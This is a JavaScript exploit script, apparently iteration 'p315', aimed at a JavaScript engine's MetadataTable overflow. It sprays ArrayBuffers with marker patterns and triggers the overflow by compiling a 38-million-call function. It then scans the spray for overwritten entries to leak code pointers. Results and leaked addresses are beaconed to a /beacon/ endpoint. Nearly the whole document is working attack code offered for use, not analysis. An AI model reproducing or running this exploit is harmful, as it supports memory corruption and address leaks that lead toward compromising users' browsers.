// p315 - MetadataTable overflow: spray AFTER compile
//
// p310 failed because spray didn't land after MetadataTable.
// New strategy: compile first, then spray.
// The 4.3GB forward sweep during finishCreation has ALREADY happened
// by the time COMPILED-OK fires. So the spray buffers allocated AFTER
// compile will be at higher addresses, potentially in already-written
// pages (MADV_FREE preserved mappings).
//
// But wait: the overflow writes to EXISTING mapped pages during compile.
// New spray buffers allocated AFTER compile get FRESH pages from the
// allocator, which may reuse the overflow-written pages.
// If we allocate 100112-byte buffers, they go to marge bitfit (same tier
// as MetadataTable). Some of these fresh allocations may land on pages
// that were written by the overflow sweep, and the allocator may NOT
// zero them (fastCalloc zeros, but the pages themselves retain data
// from the sweep if they were MADV_FREE'd and not reclaimed by OS).
//
// Actually: ArrayBuffer::create uses fastCalloc which ZEROS memory.
// So we can't read sweep residue from new allocations.
//
// REAL strategy: allocate spray BEFORE compile. Use spray buffers
// as sentinels. Some will be at LOWER addresses (useless) and some
// at HIGHER addresses (hit by forward sweep). The ones at higher
// addresses get OVERWRITTEN by the sweep during finishCreation.
// We just need ENOUGH spray to cover the forward range.
//
// The sweep writes 4.3GB. At 100KB per buffer, that's ~43000 buffers
// worth of range. We can't spray 43000 buffers. But the sweep hits
// whatever is mapped, including OS pages. The spray just needs to have
// SOME buffers in the forward path.
//
// Approach: spray a LOT of buffers (2000), compile, scan ALL of them.
// Some fraction will be at higher addresses than MetadataTable.
//
// Beacon prefix: V315-

(function() {
  function B(tag, body) {
    try {
      var u = '/beacon/V315-' + tag + '?t=' + Date.now();
      if (body !== undefined && String(body).length < 2000) {
        var x = new XMLHttpRequest();
        x.open('POST', u, true);
        x.send(String(body));
      } else {
        new Image().src = u;
      }
    } catch (e) {
      try { new Image().src = '/beacon/V315-' + tag; } catch(e2) {}
    }
  }
  function hexByte(v) { return (v < 16 ? '0' : '') + v.toString(16); }
  function hex8(view, off) {
    var s = '';
    for (var i = 7; i >= 0; i--) s += hexByte(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }
  function nz(view, off, len) {
    for (var i = 0; i < len; i++) { if (view[off + i] !== 0) return true; }
    return false;
  }

  B('BOOT');

  var BUF_SZ = 100112;
  var SPRAY_COUNT = 1500;
  var MARKER = 0x41; // 'A' — known pattern

  // Phase 1: Spray before compile, fill with known pattern
  var bufs = new Array(SPRAY_COUNT);
  var views = new Array(SPRAY_COUNT);
  for (var i = 0; i < SPRAY_COUNT; i++) {
    bufs[i] = new ArrayBuffer(BUF_SZ);
    views[i] = new Uint8Array(bufs[i]);
    // Write marker at stride-112 positions (where sweep would write)
    for (var m = 12; m + 4 <= BUF_SZ; m += 112) {
      views[i][m] = MARKER;
      views[i][m+1] = MARKER;
      views[i][m+2] = MARKER;
      views[i][m+3] = MARKER;
    }
  }
  B('SPRAY-' + SPRAY_COUNT);

  // Phase 2: Build and compile the 38M function
  // finishCreation() writes 4.3GB forward from MetadataTable
  var N = 38348816;
  var CHUNK = 4000000;
  var nChunks = Math.floor(N / CHUNK);
  var rem = N - nChunks * CHUNK;

  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(nChunks + 3);
  parts[0] = 'window.__p315fn=function(a){';
  for (var c = 0; c < nChunks; c++) parts[1 + c] = callChunk;
  parts[nChunks + 1] = 'a();'.repeat(rem);
  parts[nChunks + 2] = '};window.__p315scan();';
  callChunk = null;

  var blob = new Blob(parts, {type: 'application/javascript'});
  var blobMB = Math.round(blob.size / 1048576);
  parts = null;
  B('BLOB-' + blobMB + 'MB');

  // Phase 3: scan function runs after compile (from script eval)
  window.__p315scan = function() {
    B('COMPILED-OK');
    doScan();
  };

  var url = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  document.head.appendChild(sc);
  sc.src = url;

  setTimeout(function() {
    if (!window.__p315fn) B('TIMEOUT-NO-COMPILE');
  }, 45000);

  function doScan() {
    var hitBufs = 0;
    var leaks = [];
    var firstHitIdx = -1;

    for (var vi = 0; vi < SPRAY_COUNT; vi++) {
      var view = views[vi];
      if (!view || !view.buffer || view.buffer.byteLength !== BUF_SZ) continue;

      // Quick scan: check if marker was overwritten at stride-112 positions
      // Our marker: 0x41414141 at +12. Sweep writes 0xFFFFFFFF at +12.
      // If we see anything other than 0x41414141 or 0x00000000, it was overwritten.
      var hasOverwrite = false;
      for (var q = 12; q + 4 <= BUF_SZ && !hasOverwrite; q += 112) {
        var v = u32(view, q);
        if (v !== 0x41414141 && v !== 0x00000000) hasOverwrite = true;
      }
      if (!hasOverwrite) continue;

      if (firstHitIdx < 0) firstHitIdx = vi;
      hitBufs++;

      if (leaks.length >= 10) continue;

      // Find entry alignment (m_slowPathCount at +12 = 0xFFFFFFFF)
      var bestBase = -1;
      var bestHits = 0;
      for (var tryBase = 0; tryBase < 112; tryBase++) {
        var hits = 0;
        for (var off = tryBase + 12; off + 4 <= BUF_SZ; off += 112) {
          if (u32(view, off) === 0xFFFFFFFF) hits++;
        }
        if (hits > bestHits) { bestHits = hits; bestBase = tryBase; }
      }

      if (bestBase < 0 || bestHits < 3) continue;

      // Read m_slowPathCallDestination at base+24 (8 bytes, pointer)
      for (var off = bestBase + 24; off + 8 <= BUF_SZ; off += 112) {
        var ptr = hex8(view, off);
        if (ptr !== '0000000000000000') {
          leaks.push('B' + vi + '-O' + off + '-P' + ptr);
          break;
        }
      }
    }

    B('RESULT-bufs' + hitBufs + '-leaks' + leaks.length + '-first' + firstHitIdx);

    for (var i = 0; i < leaks.length; i++) {
      B('LEAK-' + i + '-' + leaks[i]);
    }

    if (hitBufs === 0) {
      // Diagnostic: count buffers where marker is still intact vs zeroed vs modified
      var intact = 0, zeroed = 0, modified = 0;
      for (var vi = 0; vi < Math.min(200, SPRAY_COUNT); vi++) {
        var view = views[vi];
        if (!view || !view.buffer) continue;
        var v = u32(view, 12);
        if (v === 0x41414141) intact++;
        else if (v === 0x00000000) zeroed++;
        else modified++;
      }
      B('DIAG-I' + intact + '-Z' + zeroed + '-M' + modified);
      // Also dump first modified buffer's first few strides if any
      if (modified > 0) {
        for (var vi = 0; vi < Math.min(200, SPRAY_COUNT); vi++) {
          var view = views[vi];
          if (!view || !view.buffer) continue;
          var v = u32(view, 12);
          if (v !== 0x41414141 && v !== 0x00000000) {
            var dump = 'B' + vi;
            for (var s = 0; s < 5 && s * 112 + 32 <= BUF_SZ; s++) {
              dump += '|' + hex8(view, s * 112 + 12) + '-' + hex8(view, s * 112 + 24);
            }
            B('DUMP-' + dump);
            break;
          }
        }
      }
    }

    B('DONE');
  }
})();
